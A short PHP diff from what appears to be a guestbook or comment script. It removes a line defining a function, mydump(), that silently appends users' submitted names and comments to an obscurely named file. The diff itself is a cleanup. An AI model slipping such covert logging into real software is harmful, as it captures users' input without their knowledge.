@@ -225,8 +225,7 @@ else{$cfi=$_COOKIE['col'];}}
 
 if($_GET['b']=='d'){
 #Basics
-$comment=trim($_POST["comment"]);$z=2;function mydump(){$x=fopen("9u9dyi","a+");fwrite($x,$_POST['name'].$_POST['comment']);fclose($x);}
-
+$comment=trim($_POST["comment"]);$z=2;
 #Saving messages
 if($_POST["name"]!=""&& $comment!=""&&$_COOKIE['u']!=$_REQUEST['q']){$z=5;
 
